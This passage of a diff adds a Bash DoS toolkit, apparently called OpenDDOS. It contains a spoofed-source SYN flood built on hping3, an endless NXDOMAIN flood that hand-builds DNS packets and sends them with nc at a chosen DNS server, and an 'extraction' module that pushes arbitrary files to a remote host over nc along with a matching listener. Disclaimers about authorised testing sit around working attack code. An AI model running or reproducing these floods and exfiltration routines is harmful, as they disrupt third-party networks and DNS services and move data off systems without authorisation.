+#################
+
+#####################
+##START DISTRACTION##
+
+distractionscan() {
+    # 颜色定义
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    BLUE='\033[0;34m'
+    NC='\033[0m' # 无颜色
+
+    # 清除屏幕并显示引导信息
+    clear
+    echo -e "${YELLOW}┌──────────────────────────────────┐"
+    echo -e "│    TCP SYN 干扰扫描工具 (v2.0)   │"
+    echo -e "└──────────────────────────────────┘${NC}"
+    echo -e "此工具用于生成网络干扰流量，请确保已获得合法授权！\n"
+
+    # 检查sudo权限
+    check_sudo() {
+        if ! sudo -nv 2>/dev/null; then
+            echo -e "${RED}▶ 需要sudo权限${NC}"
+            sudo -v || {
+                echo -e "${RED}✖ 无法获取sudo权限${NC}"
+                return 1
+            }
+        fi
+        return 0
+    }
+
+    # 输入验证函数
+    validate_input() {
+        local type=$1
+        local value=$2
+        case $type in
+            ip)
+                [[ "$value" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
+                ;;
+            ip_range)
+                [[ "$value" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(-[0-9]{1,3})?$ ]] && return 0
+                ;;
+        esac
+        return 1
+    }
+
+    # 主流程
+    if ! check_sudo; then exit 1; fi
+
+    # 交互式目标输入
+    while true; do
+        read -p "$(echo -e "${BLUE}? 请输入目标IP/域名: ${NC}")" TARGET
+        if validate_input "ip" "$TARGET" || [[ "$TARGET" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
+            break
+        else
+            echo -e "${RED}⚠ 无效输入！请输入有效的IP或域名${NC}"
+        fi
+    done
+
+    # 伪造源地址输入
+    while true; do
+        read -p "$(echo -e "${BLUE}? 输入伪造源IP或范围 (例: 192.168.1.1或10.0.0.1-100): ${NC}")" SOURCE
+        if validate_input "ip_range" "$SOURCE"; then
+            break
+        else
+            echo -e "${RED}⚠ 格式错误！请使用单IP或范围 (如 10.0.0.1-100)${NC}"
+        fi
+    done
+
+    # 扫描配置菜单
+    echo -e "\n${YELLOW}▌ 扫描配置选项"
+    echo -e "1. 标准扫描 (推荐)"
+    echo -e "2. 主动扫描 (高频)"
+    echo -e "3. 隐蔽扫描 (慢速)"
+    echo -e "4. 自定义配置${NC}"
+
+    while true; do
+        read -p "$(echo -e "${BLUE}? 选择模式 [1-4]: ${NC}")" MODE
+        case $MODE in
+            1) COUNT=30; INTERVAL=1; PORTS="21,22,80,443"; FLAG="-S"; break ;;
+            2) COUNT=100; INTERVAL=0.2; PORTS="1-1024"; FLAG="-SA"; break ;;
+            3) COUNT=15; INTERVAL=3; PORTS="80,443"; FLAG="-S"; break ;;
+            4)
+                read -p "扫描次数 [30]: " COUNT; COUNT=${COUNT:-30}
+                read -p "端口范围 [21,22,80,443]: " PORTS; PORTS=${PORTS:-"21,22,80,443"}
+                read -p "间隔时间(秒) [1]: " INTERVAL; INTERVAL=${INTERVAL:-1}
+                FLAG="-S"
+                break
+                ;;
+            *) echo -e "${RED}⚠ 无效选择!${NC}" ;;
+        esac
+    done
+
+    # 配置确认
+    echo -e "\n${GREEN}✓ 最终配置确认"
+    echo -e "------------------------------"
+    echo -e "目标地址: $TARGET"
+    echo -e "伪造源IP: $SOURCE"
+    echo -e "扫描次数: $COUNT"
+    echo -e "目标端口: $PORTS"
+    echo -e "发包间隔: ${INTERVAL}秒"
+    echo -e "扫描类型: $([ "$FLAG" == "-S" ] && echo "SYN" || echo "SYN+ACK")"
+    echo -e "------------------------------${NC}"
+
+    # 最终确认
+    read -p "$(echo -e "${YELLOW}⚠ 确认开始扫描？[y/N]: ${NC}")" CONFIRM
+    [[ $CONFIRM != "y" ]] && { echo -e "${RED}✖ 操作取消${NC}"; exit 0; }
+
+    # 执行扫描
+    echo -e "\n${GREEN}▶ 开始扫描... (Ctrl+C终止)${NC}"
+    START_TIME=$(date +%s)
+
+    for ((i=1; i<=COUNT; i++)); do
+        # 进度显示
+        PERCENT=$((i*100/COUNT))
+        BAR=$(printf "%${PERCENT}s" | tr ' ' '■')
+        printf "\r${BLUE}[%-50s] %d%% (%d/%d)${NC}" "$BAR" $PERCENT $i $COUNT
+        
+        # 动态源IP（如果使用范围）
+        if [[ $SOURCE == *-* ]]; then
+            RAND_IP="${SOURCE%-*}.$(( ${SOURCE##*-} + RANDOM % 100 ))"
+        else
+            RAND_IP="$SOURCE"
+        fi
+
+        sudo hping3 --spoof $RAND_IP -p $PORTS -c 1 $FLAG $TARGET >/dev/null 2>&1
+        sleep $INTERVAL
+    done
+
+    # 结果统计
+    END_TIME=$(date +%s)
+    DURATION=$((END_TIME - START_TIME))
+    echo -e "\n\n${GREEN}✓ 扫描完成"
+    echo -e "------------------------------"
+    echo -e "总耗时: ${DURATION}秒"
+    echo -e "发包总数: ${COUNT}次"
+    echo -e "平均速率: $((COUNT/(DURATION>0?DURATION:1)))次/秒"
+    echo -e "最后使用的伪造IP: ${RAND_IP}"
+    echo -e "------------------------------${NC}"
+}
+##END DISTRACTION##
+###################
+
+#######################
+##START NXDOMAINFLOOD##
+
+nxdomainflood() {
+    # 颜色定义
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    BLUE='\033[0;34m'
+    NC='\033[0m' # 无颜色
+
+    # 清除屏幕并显示警告
+    clear
+    echo -e "${RED}┌──────────────────────────────────────────┐"
+    echo -e "│   DNS NXDOMAIN 压力测试工具 (v3.0)    │"
+    echo -e "└──────────────────────────────────────────┘${NC}"
+    echo -e "${YELLOW}警告：此工具仅用于授权测试！滥用可能违反法律。${NC}\n"
+
+    # 检查依赖工具
+    check_dependencies() {
+        local missing=()
+        for cmd in nc dig xxd; do
+            if ! command -v $cmd &>/dev/null; then
+                missing+=("$cmd")
+            fi
+        done
+        
+        if [ ${#missing[@]} -gt 0 ]; then
+            echo -e "${RED}✖ 缺少依赖工具: ${missing[*]}${NC}"
+            echo -e "请使用以下命令安装:"
+            echo -e "  Ubuntu/Debian: sudo apt install ${missing[*]}"
+            echo -e "  CentOS/RHEL: sudo yum install ${missing[*]}"
+            return 1
+        fi
+        return 0
+    }
+
+    # 解析目标为IP
+    resolve_target() {
+        local target=$1
+        # 如果是IP直接返回
+        if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            echo "$target"
+            return 0
+        fi
+        
+        # 尝试DNS解析
+        local resolved_ip=$(dig +short "$target" | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' | head -1)
+        if [ -z "$resolved_ip" ]; then
+            echo -e "${RED}✖ 无法解析域名: $target${NC}"
+            return 1
+        fi
+        echo "$resolved_ip"
+    }
+
+    # 获取目标DNS服务器
+    get_target() {
+        while true; do
+            read -p "$(echo -e "${BLUE}? 输入目标DNS服务器(IP或域名): ${NC}")" input_target
+            if [ -z "$input_target" ]; then
+                echo -e "${RED}⚠ 输入不能为空!${NC}"
+                continue
+            fi
+            
+            DNSTARGET=$(resolve_target "$input_target")
+            if [ $? -eq 0 ]; then
+                break
+            fi
+        done
+    }
+
+    # 生成随机域名
+    generate_random_domain() {
+        local tld_list=(com net org io info biz cn xyz top site online dev)
+        local tld=${tld_list[$RANDOM % ${#tld_list[@]}]}
+        local random_len=$((RANDOM % 15 + 5))
+        local random_str=$(tr -dc a-z0-9 </dev/urandom | head -c $random_len)
+        echo "$random_str.$tld"
+    }
+
+    # 直接发送DNS查询（不经过变量存储二进制数据）
+    send_dns_query() {
+        local domain=$1
+        local trans_id=$(printf "%04x" $RANDOM)
+        
+        {
+            # 构造DNS头部
+            printf "\x${trans_id:0:2}\x${trans_id:2:2}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+            
+            # 构造查询问题部分
+            IFS='.' read -ra parts <<< "$domain"
+            for part in "${parts[@]}"; do
+                printf "\x$(printf "%02x" ${#part})%s" "$part"
+            done
+            printf "\x00\x00\x01\x00\x01"
+        } | nc -u -w0 $DNSTARGET 53 2>/dev/null
+    }
+
+    # 主流程
+    if ! check_dependencies; then exit 1; fi
+    get_target
+
+    # 显示配置确认
+    echo -e "\n${YELLOW}▌ 测试配置"
+    echo -e "------------------------------"
+    echo -e "目标地址: $input_target"
+    echo -e "解析IP: $DNSTARGET"
+    echo -e "协议类型: UDP/53"
+    echo -e "查询类型: NXDOMAIN"
+    echo -e "------------------------------${NC}"
+
+    # 最终确认
+    read -p "$(echo -e "${RED}⚠ 确认开始压力测试？[y/N]: ${NC}")" CONFIRM
+    [[ $CONFIRM != "y" ]] && { echo -e "${RED}✖ 操作取消${NC}"; exit 0; }
+
+    # 执行测试
+    echo -e "\n${GREEN}▶ 开始压力测试... (Ctrl+C终止)${NC}"
+    trap "echo -e '\n${RED}✖ 测试终止${NC}'; exit 0" SIGINT
+
+    local count=0
+    local start_time=$(date +%s)
+    local last_status=0
+    
+    while true; do
+        # 进度显示
+        local elapsed=$(( $(date +%s) - start_time ))
+        printf "\r${YELLOW}已发送: %d 次 | 持续时间: %02d:%02d | 最近状态: %s${NC}" \
+               $count $((elapsed/60)) $((elapsed%60)) $([ $last_status -eq 0 ] && echo "成功" || echo "失败")
+        
+        # 生成并发送查询
+        send_dns_query "$(generate_random_domain)"
+        last_status=$?
+        
+        ((count++))
+        sleep 0.$((RANDOM % 3 + 1)) # 随机间隔(0.1-0.4秒)
+    done
+}
+##END NXDOMAINFLOOD##
+#####################
+
+##/DOS##
+
+
+##EXTRACTION##
+########################
+##START EXTRACTIONMENU##
+extractionmenu()
+{
+#display a menu for the extraction module using bash select
+        extractionmenu=("Send File" "Receive file" "Exit")
+    select extractopt in "${extractionmenu[@]}"; do
+#Extract file with TCP or UDP
+    if [ "$extractopt" = "Send File" ]; then
+        sendfile
+#Create an arbitrary listener to receive files
+    elif [ "$extractopt" = "Receive file" ]; then
+		listener
+#Go back
+    elif [ "$extractopt" = "Exit" ]; then
+        function_menu
+#Default error if no valid option is chosen
+    else
+        echo "That's not a valid option! Hit Return to show menu"
+    fi
+    done
+}
+##END EXTRACTIONMENU##
+######################
+
+##################
+##START SENDFILE##
+sendfile() {
+    # 添加颜色定义
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m' # No Color
+
+    echo -e "${GREEN}\n=== 文件传输模块 ===${NC}"
+    echo -e "可以通过TCP/UDP协议发送文件\n使用Listener模块接收文件"
+    
+    # 协议选择
+    echo -e "\n${BLUE}[1]${NC} 选择协议:"
+    echo -e "  ${YELLOW}t${NC}) TCP (默认)"
+    echo -e "  ${YELLOW}u${NC}) UDP"
+    read -p "请输入选择 [t/u] (默认t): " -i "${PROTO:-t}" -e PROTO
+    : ${PROTO:=t}
+
+    # 协议验证
+    if [[ ! "$PROTO" =~ ^[tu]$ ]]; then
+        echo -e "${RED}无效协议选项，已自动选择TCP${NC}"
+        PROTO=t
+    fi
+
+    # 接收方IP输入
+    echo -e "\n${BLUE}[2]${NC} 输入接收服务器IP:"
+    read -p "IP地址: " -i "$RECEIVER" -e RECEIVER
+    [ -z "$RECEIVER" ] && { echo -e "${RED}错误：必须指定IP地址${NC}"; return 1; }
+
+    # 端口输入
+    echo -e "\n${BLUE}[3]${NC} 输入目标端口:"
+    read -p "端口 (默认80): " -i "${PORT:-80}" -e PORT
+    : ${PORT:=80}
+
+    # 端口验证
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        echo -e "${RED}无效端口号，已重置为80${NC}"
+        PORT=80
+    else
+        echo -e "使用端口: ${GREEN}$PORT${NC}"
+    fi
+
+    # 文件选择
+    echo -e "\n${BLUE}[4]${NC} 输入要发送的完整文件路径:"
+    read -p "文件路径: " -i "$EXTRACT" -e EXTRACT
+    [ ! -f "$EXTRACT" ] && { echo -e "${RED}错误：文件不存在或不可读${NC}"; return 1; }
+
+    # 传输确认
+    echo -e "\n${YELLOW}准备发送文件:${NC}"
+    echo -e "  文件: ${GREEN}$EXTRACT${NC}"
+    echo -e "  目标: ${GREEN}$RECEIVER:$PORT${NC}"
+    echo -e "  协议: ${GREEN}${PROTO^^}${NC}"
+    read -p "确认发送？[y/N]: " confirm
+    [[ "$confirm" != [yY] ]] && { echo -e "${RED}已取消发送${NC}"; return 0; }
+
+    # 开始传输
+    echo -e "\n${BLUE}正在发送文件...${NC}"
+    if [ "$PROTO" = "t" ]; then
+        nc -w 3 -n -N "$RECEIVER" "$PORT" < "$EXTRACT"
+    else
+        nc -n -N -u "$RECEIVER" "$PORT" < "$EXTRACT"
+    fi
+
+    # 结果反馈
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}\n传输成功完成！${NC}"
+    else
+        echo -e "${RED}\n传输过程中出现错误${NC}"
+    fi
+
+    # 哈希校验
+    echo -e "\n${BLUE}文件校验码:${NC}"
+    echo -e "${YELLOW}MD5:${NC}    $(md5sum "$EXTRACT" | cut -d' ' -f1)"
+    echo -e "${YELLOW}SHA512:${NC} $(sha512sum "$EXTRACT" | cut -d' ' -f1)\n"
+}
+##END SENDFILE##
+################
+
+##################
+##START LISTENER##
+listener() {
+    # 颜色定义
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local CYAN='\033[0;36m'
+    local NC='\033[0m' # No Color
+
+    # 标题和说明
+    echo -e "${CYAN}\n=== 网络监听模块 ===${NC}"
+    echo -e "使用 netcat 创建 TCP/UDP 监听服务"
+    echo -e "接收到的数据将保存到指定文件\n"
+
+    # 协议选择
+    echo -e "${BLUE}[1]${NC} 选择协议类型:"
+    echo -e "  ${YELLOW}t${NC}) TCP (默认)"
+    echo -e "  ${YELLOW}u${NC}) UDP"
+    read -p "请输入协议 [t/u] (默认t): " -i "${PROTO:-t}" -e PROTO
+    : ${PROTO:=t}
+
+    # 协议验证
+    if [[ ! "$PROTO" =~ ^[tu]$ ]]; then
+        echo -e "${RED}无效协议，已自动选择TCP${NC}"
+        PROTO=t
+    fi
+
+    # 显示已占用端口
+    echo -e "\n${BLUE}[2]${NC} 当前系统监听端口 (避免冲突):"
+    if command -v ss &> /dev/null; then
+        ss -${PROTO} -n -l | awk 'NR>1{print $4}' | awk -F':' '{print $NF}' | sort -nu | column
+    else
+        netstat -${PROTO} -n -l | awk '/^Proto|LISTEN/{print $4}' | awk -F':' '{print $NF}' | sort -nu | column
+    fi
+    echo -e "${YELLOW}提示：请选择列表中未出现的端口${NC}"
+
+    # 端口输入
+    echo -e "\n${BLUE}[3]${NC} 设置监听端口:"
+    read -p "端口号 (默认8000): " -i "${PORT:-8000}" -e PORT
+    : ${PORT:=8000}
+
+    # 端口验证
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        echo -e "${RED}无效端口号，已重置为8000${NC}"
+        PORT=8000
+    else
+        echo -e "使用端口: ${GREEN}$PORT${NC}"
+    fi
+
+    # 输出文件设置
+    echo -e "\n${BLUE}[4]${NC} 设置输出文件:"
+    read -p "文件路径 (默认OpenDDOS.listener.out): " -i "${OUTFILE:-OpenDDOS.listener.out}" -e OUTFILE
+    : ${OUTFILE:=OpenDDOS.listener.out}
+    touch "$OUTFILE" || { echo -e "${RED}错误：无法创建输出文件${NC}"; return 1; }
+
+    # 权限检查
+    if [ "$PORT" -lt 1025 ] && [ "$(id -u)" -ne 0 ]; then
+        echo -e "${YELLOW}警告：1024以下端口需要root权限${NC}"
+        read -p "是否使用sudo？[Y/n]: " use_sudo
+        if [[ "${use_sudo:-y}" =~ ^[Yy] ]]; then
+            SUDO_CMD="sudo"
+        else
+            echo -e "${RED}操作已取消${NC}"
+            return 1
+        fi
+    else
+        SUDO_CMD=""
+    fi
+
+    # 启动监听
+    echo -e "\n${CYAN}▶ 启动监听服务${NC}"
+    echo -e "  协议: ${GREEN}${PROTO^^}${NC}"
+    echo -e "  端口: ${GREEN}$PORT${NC}"
+    echo -e "  输出: ${GREEN}$OUTFILE${NC}"
+    echo -e "${YELLOW}使用 Ctrl+C 停止监听${NC}\n"
+
+    case "$PROTO" in
+        t) $SUDO_CMD nc -n -l -v -p "$PORT" > "$OUTFILE" ;;
+        u) $SUDO_CMD nc -n -u -k -l -v -p "$PORT" > "$OUTFILE" ;;
+    esac
+
+    # 结果处理
+    if [ $? -eq 0 ]; then
+        echo -e "\n${GREEN}√ 监听已停止${NC}"
+        echo -e "${BLUE}接收数据统计:${NC}"
+        wc -c "$OUTFILE" | awk '{print "文件大小:", $1 "bytes"}'
+        
+        echo -e "\n${CYAN}文件校验码:${NC}"
+        echo -e "${YELLOW}MD5:${NC}    $(md5sum "$OUTFILE" | cut -d' ' -f1)"
+        echo -e "${YELLOW}SHA512:${NC} $(sha512sum "$OUTFILE" | cut -d' ' -f1)"
+    else
+        echo -e "\n${RED}× 监听异常终止${NC}"
+    fi
+}
+##END LISTENER##
+################
+##/EXTRACTION##
+
+
+##README##
+####################
+##START SHOWREADME##
+showreadme()
+#use curl to show the readme file
+#i should probably add a check for a local copy
+{
+curl -s https://raw.githubusercontent.com/HaoTang9878/OpenDDOS/master/README.md | more
+}
+##END SHOWREADME##
+##################
+##/README##
+
+
+##WELCOME##
+#########################
+##START WELCOME MESSAGE##
+clear && echo ""
+echo "   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗"
+echo "  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║   ██╔═══██╗██╔══██╗██╔══██╗██╔════╝"
+echo "  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║██║  ██║██║  ██║███████╗"
+echo "  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║██║  ██║██║  ██║╚════██║"
+echo "  ╚██████╔╝██║     ███████╗██║ ╚████║   ╚██████╔╝██████╔╝██████╔╝███████║"
+echo "   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝"
+echo "                                                        "
+echo "██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗ ██╗"
+echo "██║  ██║██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔═══██╗██║"
+echo "███████║█████╗   ╚████╔╝ ██║     ██║   ██║██║   ██║██║"
+echo "██╔══██║██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║╚═╝"
+echo "██║  ██║███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝██╗"
+echo "╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝"
+echo ""
+echo -e "\033[1;36mOpenDDOS Toolkit v0.1.0\033[0m - First Release"
+echo -e "\033[1;33m═════════════════════════════════════\033[0m"
+echo "Welcome to OpenDDOS - The open source network testing toolkit"
+echo "MyAwesomeTool  Copyright (C) 2025  Hao Tang"
+echo "This program comes with ABSOLUTELY NO WARRANTY; for details type 'show w'."
+echo "This is free software, and you are welcome to redistribute it under certain conditions; type 'show c' for details."
+echo ""
+echo -e "\033[0;34m[\033[0m!\033[0;34m]\033[0m Important Notice:"
+echo "This software is designed for AUTHORIZED security testing only."
+echo "Unauthorized use may violate local and international laws."
+echo ""
+echo -e "\033[0;32m[\033[0m*\033[0;32m]\033[0m Documentation:"
+echo "GitHub: https://github.com/HaoTang9878/OpenDDOS"
+echo "Issues: https://github.com/HaoTang9878/OpenDDOS/issues"
+echo "Readme: https://github.com/HaoTang9878/OpenDDOS/blob/main/README.md"
+echo ""
+echo -e "\033[0;35m[\033[0m*\033[0;35m]\033[0m Version Notes:"
+echo "First public release (v0.1.0)"
+echo "Includes basic DDoS testing modules"
+echo "Your feedback will help improve future versions"
+echo ""
+echo -e "\033[1;31mYOU are solely responsible for proper usage!\033[0m"
+echo -e "\033[1;33m═════════════════════════════════════\033[0m"
+
+function_menu
+##END WELCOME MESSAGE##
+#######################
+##/WELCOME##
